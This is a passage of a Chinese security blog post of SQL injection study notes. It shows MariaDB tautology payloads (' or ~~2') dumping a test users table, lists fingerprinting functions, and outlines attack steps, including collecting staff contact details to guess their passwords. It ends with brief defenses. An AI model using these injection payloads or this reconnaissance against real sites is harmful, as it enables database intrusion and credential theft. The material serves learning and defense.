class="hljs-number">2</span><br>    <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> ;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+</span><br><span class="hljs-operator">|</span> <span class="hljs-operator">~</span><span class="hljs-operator">~</span><span class="hljs-number">2</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">2</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>MariaDB [test1]<span class="hljs-operator">&gt;</span> <br><br><span class="hljs-comment">/*MariaDB [test1]&gt; select * from users where username=&#x27;hahaah&#x27; or ~~2;</span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">| username | uid   | password | mobile |</span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">| reader1  | 12136 | NULL     |   NULL |</span><br><span class="hljs-comment">| reader2  | 12138 | NULL     |   NULL |</span><br><span class="hljs-comment">| admin    | 12137 | 123      |    123 |</span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">3 rows in set (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MariaDB [test1]&gt; select * from users where username=&#x27;hahaah&#x27; and ~~2;</span><br><span class="hljs-comment">Empty set (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MariaDB [test1]&gt; select * from users where username=&#x27;hahaah&#x27; or ~~2=2;</span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">| username | uid   | password | mobile |</span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">| reader1  | 12136 | NULL     |   NULL |</span><br><span class="hljs-comment">| reader2  | 12138 | NULL     |   NULL |</span><br><span class="hljs-comment">| admin    | 12137 | 123      |    123 |</span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">3 rows in set (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MariaDB [test1]&gt; select * from users where username=&#x27;reader1&#x27; &amp;&amp; ~~2=2;</span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">| username | uid   | password | mobile |</span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">| reader1  | 12136 | NULL     |   NULL |</span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">1 row in set (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MariaDB [test1]&gt; </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="5-探子回报与密码猜测相关函数"><a href="#5-探子回报与密码猜测相关函数" class="headerlink" title="5.探子回报与密码猜测相关函数"></a>5.探子回报与密码猜测相关函数</h3><p>探子函数（version();user()）：目的是为了查看网页对对函数有过滤，执行成功，说明程序对函数括号和子查询并未做过滤，可能可以执行函数、子查询等复杂逻辑，若不成功，基本上说明注入攻击困难或者注入可能性很小。</p>
+<p>两个函数都是SQL99标准中通用的函数，不同的数据库返回值都各有特征，进而推断是什么数据库类型。</p>
+<p>如:user()函数返回情况：MYSQL返回root@localhost、Oracle返回sys、sqlserver返回sa</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span><br><br><span class="hljs-function"><span class="hljs-title">current_user</span><span class="hljs-params">()</span></span><br><br><span class="hljs-function"><span class="hljs-title">session_user</span><span class="hljs-params">()</span></span><br><br><span class="hljs-function"><span class="hljs-title">version</span><span class="hljs-params">()</span></span><br><br><span class="hljs-function"><span class="hljs-title">database</span><span class="hljs-params">()</span></span><br><br><span class="hljs-function"><span class="hljs-title">length</span><span class="hljs-params">()</span></span><br><br><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">()</span></span><br><br><span class="hljs-function"><span class="hljs-title">substring</span><span class="hljs-params">()</span></span><br><br><span class="hljs-function"><span class="hljs-title">position</span><span class="hljs-params">(<span class="hljs-string">&#x27;@&#x27;</span> in user()</span></span>)：返回字符所在字符串中的位置<br><br><span class="hljs-function"><span class="hljs-title">locate</span><span class="hljs-params">(<span class="hljs-string">&#x27;@&#x27;</span>,user()</span></span>):返回字符所在字符串中的位置<br><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="6-MYSQL中SQL注入攻击实例学习笔记"><a href="#6-MYSQL中SQL注入攻击实例学习笔记" class="headerlink" title="6.MYSQL中SQL注入攻击实例学习笔记"></a>6.MYSQL中SQL注入攻击实例学习笔记</h2><h4 id="1-sql注入的攻击步骤："><a href="#1-sql注入的攻击步骤：" class="headerlink" title="1.sql注入的攻击步骤："></a>1.sql注入的攻击步骤：</h4><p>1.确认注入攻击目标网站</p>
+<p>2.目标网站的一般信息收集、分析与提取</p>
+<p>3.网站技术分析：寻找和测试可用注入点，网页输入输出机制分析</p>
+<p>4.探子回报：注入SQL确定数据库类型，当前账户权限级别</p>
+<p>5.提权分析：根据用户级别确定是否可以与系统层交互提权，是否可以与数据库交互提权，是否可以获取web后台管理员权限的可能性</p>
+<p>6.网站可用SQL注入攻击类型判断</p>
+<h4 id="2-攻击的准备"><a href="#2-攻击的准备" class="headerlink" title="2.攻击的准备"></a>2.攻击的准备</h4><p><strong>1.信念：没有无用的信息</strong></p>
+<p>2.一般信息收集、分析与提取</p>
+<p>域名信息</p>
+<p>域名信息的扩展信息，如注册人，公司，联系电话等信息收集</p>
+<p>网站所有相关工作人员的信息，比如技术研发人员相关联系方式：qq/手机/博客/微博。目标是得到相关人员对密码设置的习惯和规律</p>
+<p>3.技术分析</p>
+<p>一般信息关联的可能性，网页源代码分析，输入输出机制分析</p>
+<h2 id="7-如何防御"><a href="#7-如何防御" class="headerlink" title="7.如何防御"></a>7.如何防御</h2><p>代码层：</p>
+<p>使用PDO预处理，数据代码分离，关键字过滤等等</p>
+<p>系统层防御：</p>
+<p>1.iptables限制只允许特定的服务器ip和端口登录</p>
+<p>2.使用应用防火墙对sql注入拒绝waf</p>
+<p>3.使用数据库安全中间件，如安全狗等</p>
+<p>数据库层：</p>
+<p>数据库防御的目的是辅助型的，预防SQL注入在数据层交互提权，防止SQL注入成功后权限和数据泄露进一步扩大。</p>
+<p>SQL权限最小化原则</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/">备忘录</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/03/26/2020-3-24-fckeditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">fckeditor编辑器漏洞集合</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/03/24/msf%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/">
+                        <span class="hidden-mobile">msf操作命令备忘录</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
